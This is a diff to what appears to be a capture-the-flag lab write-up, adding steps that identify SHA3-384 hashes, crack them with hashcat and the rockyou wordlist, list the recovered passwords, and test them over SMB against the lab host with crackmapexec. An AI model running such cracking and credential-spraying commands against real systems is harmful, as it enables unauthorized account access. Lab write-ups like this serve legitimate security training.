@@ -182,6 +182,34 @@ cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a
 ```
 
 So seeing the length of the hashes it's a sha but don't know if it's 256-512 or in b/w 
-after some research on hashcat wiki i confirmed that it's hash 384
+after some research on HashCat wiki i confirmed that it's hash 384 but didn't know if it's 
+sha2 or sha3 or what.
 10800	SHA2-384
+17500 SHA3-384
+17900 Keccak-384
+
+And finally this worked
+```
+.\hashcat.exe -m 17500 -D 2 .\hashes4.txt .\rockyou.txt -O
+```
+
+```
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
+68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
+Approaching final keyspace - workload adjusted.
+```
+
+Password
+```
+password1
+finance1
+banking1
+```
+
+
+So let's validate the password
+```
+crackmapexec smb 10.10.10.179 -u new_user.txt -p password.txt 
+```
 
